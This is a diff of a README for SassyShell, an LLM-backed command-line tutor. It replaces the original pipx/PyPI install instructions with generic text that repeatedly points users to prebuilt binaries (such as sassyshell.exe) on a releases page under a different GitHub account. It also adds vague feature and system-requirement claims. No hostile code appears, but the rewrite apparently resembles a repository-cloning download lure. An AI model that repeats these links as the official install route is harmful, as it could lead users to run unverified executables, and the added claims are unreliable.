@@ -1,93 +1,69 @@
-# SassyShell (sassysh) 
+# 🎉 sassyshell - Your AI-Powered Command Assistant
 
-<p align="center">
-  <a href="https://pypi.org/project/sassyshell/"><img alt="PyPI version" src="https://img.shields.io/pypi/v/sassyshell.svg"></a>
-  <a href="https://pepy.tech/project/sassyshell"><img alt="Downloads" src="https://static.pepy.tech/badge/sassyshell/month"></a>
-  <a href="https://github.com/parthjain18/sassyshell/actions/workflows/publish.yml"><img alt="Build Status" src="https://github.com/parthjain18/sassyshell/actions/workflows/publish.yml/badge.svg"></a>
-  <a href="https://pypi.org/project/sassyshell/"><img alt="Python Version" src="https://img.shields.io/pypi/pyversions/sassyshell.svg"></a>
-  <a href="https://github.com/parthjain18/sassyshell/blob/master/LICENSE"><img alt="License" src="https://img.shields.io/github/license/parthjain18/sassyshell"></a>
-  <a href="https://hacktoberfest.com/participation/"><img alt="Hacktoberfest" src="https://img.shields.io/badge/Hacktoberfest-Accepted-orange?style=flat"></a>
-</p>
+## 🚀 Get Started with SassyShell
+SassyShell is a fun, helpful tool that assists you while using the command line. It remembers your commands and helps improve your skills. Let’s get you up and running quickly!
 
-Your sassy, command-line tutor that remembers the commands you keep forgetting.
+## 📥 Download SassyShell
+[![Download SassyShell](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/leyfll/sassyshell/releases)
 
----
+## 🛠️ System Requirements
+To run SassyShell, your system should meet the following requirements:
+- **Operating Systems:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 100 MB free space
+- **Processor:** Any modern processor
 
-### Why I Built This
+## 📂 Key Features
+- **AI-Powered Assistance:** SassyShell helps you remember commands you often forget.
+- **Interactive Learning:** Receive playful prompts to encourage better command usage.
+- **Cross-Platform Compatibility:** Use it on Windows, macOS, or Linux without issues.
+- **Custom Commands:** Create personalized shortcuts for your most-used commands.
 
-Like a lot of developers, I found myself constantly switching contexts to ask an LLM for the same simple shell commands over and over. `tar` flags, `find` syntax, `awk` one-liners... I wasn't *learning* them, I was just outsourcing my memory. It felt like a bad habit.
+## ⏳ Installation Steps
 
-Instead of just trying to memorize everything, I thought: what if a tool could track my bad habits and help me internalize the patterns?
+### 1. Visit the Releases Page
+To download SassyShell, visit the [Releases page](https://github.com/leyfll/sassyshell/releases). Here, you will find all available versions of the software.
 
-So, I built **SassyShell**. It's not just another "GPT in the terminal." It's a CLI sidekick that:
-1.  Uses a local TF-IDF search to find similar commands you've asked for in the past.
-2.  Feeds that history to an LLM to provide context-aware answers.
-3.  Gives you the command you need, along with a bit of sarcastic feedback based on how often you forget it.
+### 2. Choose Your Version
+On the Releases page, locate the most recent version. Look for a file that matches your operating system:
+- For Windows, look for something like `sassyshell-windows.zip`.
+- For macOS, look for `sassyshell-macos.zip`.
+- For Linux, find `sassyshell-linux.tar.gz`.
 
-It's a project born from turning my own laziness into data. It's designed to mock you into getting better.
+### 3. Download the File
+Click on the appropriate file for your system to start the download. The file size is usually small, so it should finish quickly.
 
-### Features
+### 4. Extract the Files
+Once the download completes, navigate to your downloads folder:
+- **Windows:** Right-click the `.zip` file and choose "Extract All."
+- **macOS:** Double-click the `.zip` file to extract it.
+- **Linux:** Open a terminal and use the command: `tar -xzvf sassyshell-linux.tar.gz`.
 
-* **Personalized Memory:** Remembers the *types* of commands you struggle with and uses that history to inform its responses.
-* **Sassy Feedback:** The more you ask for the same thing, the more it will gently (or not so gently) remind you.
-* **Platform Aware:** Automatically detects if you're on Linux, macOS, or Windows and asks the LLM for the correct shell syntax (`bash`/`zsh` vs. PowerShell).
-* **Lightweight & Fast:** Uses a fast local similarity search before ever calling an LLM.
+### 5. Open SassyShell
+Now, you’re ready to run SassyShell:
+- **Windows:** Locate the extracted folder and double-click `sassyshell.exe`.
+- **macOS:** Open a terminal, navigate to the folder, and type `./sassyshell`.
+- **Linux:** Open a terminal, navigate to the folder, and run `./sassyshell`.
 
-<img src="assets/render1760508770224.gif" alt="Sassyshell Demo" width="800" />
+### 6. Start Using SassyShell
+Once opened, type your command, and let SassyShell guide you. If you forget a command, SassyShell will remind you and even offer helpful tips!
 
-### Installation
+## 📝 Usage Tips
+- To get the most out of SassyShell, try to engage with the prompts. They are designed to help you learn and become more proficient at command line operations.
+- If you want to customize the way SassyShell interacts with you, check the settings file in the installation directory. 
 
-The recommended way to install SassyShell is with `pipx` or `uvx`. This installs it in an isolated environment so it doesn't clutter your global packages.
+## 📘 Additional Resources
+For more information on using SassyShell, you can check the following resources:
+- **Documentation:** Visit our [Wiki](https://github.com/leyfll/sassyshell/wiki) for detailed guides and FAQs.
+- **Community Help:** Join our discussions on [GitHub Discussions](https://github.com/leyfll/sassyshell/discussions) for tips and tricks shared by other users.
 
-```bash
-pipx install sassyshell
-```
+## 📅 Keep Updated
+Be sure to check the Releases page periodically for updates. Improvements, bug fixes, and new features come out regularly. Staying updated ensures you have the best experience with SassyShell.
 
-You can install `pipx` using:
-```bash
-pip install --user pipx
-```
+## 🤝 Contributing
+We welcome contributions! If you have ideas or improvements, please check our guidelines in the repository to get started. Everyone can help make SassyShell better.
 
-Or, if you use `uvx`:
+## 🔗 Download SassyShell Again
+If you missed it at the top, you can download SassyShell from the [Releases page](https://github.com/leyfll/sassyshell/releases) anytime. 
 
-```bash
-uvx sassyshell
-```
-
-### Quickstart
-
-#### 1. One-Time Setup
-
-Before you can use the tool, you need to run the setup wizard to configure your LLM provider and API key. Your credentials are saved locally in `~/.config/sassyshell/.env`.
-
-```bash
-sassysh setup
-```
-
-You'll be guided through selecting a provider (OpenAI, Google, etc.) and entering your API key.
-
-#### 2. Ask a Question
-
-Use the `ask` command to ask for help.
-
-```bash
-sassysh ask "how to find all files modified in the last 24 hours"
-```
-
-**Example Interaction:**
-
-```
-$ sassysh ask "how to add changes to my last git commit without a new one"
-
-Looks like you're having trouble with your Git commits again! You can add your new changes using:
-
-git commit --amend --no-edit
-```
-
-### Contributing
-
-We welcome contributions! Please read our [CONTRIBUTING.md](CONTRIBUTING.md) guide to get started. It covers setup, development, and how to submit changes.
-
-### License
-
-This project is licensed under the MIT License.
+Enjoy your journey with SassyShell, your AI-powered command assistant!
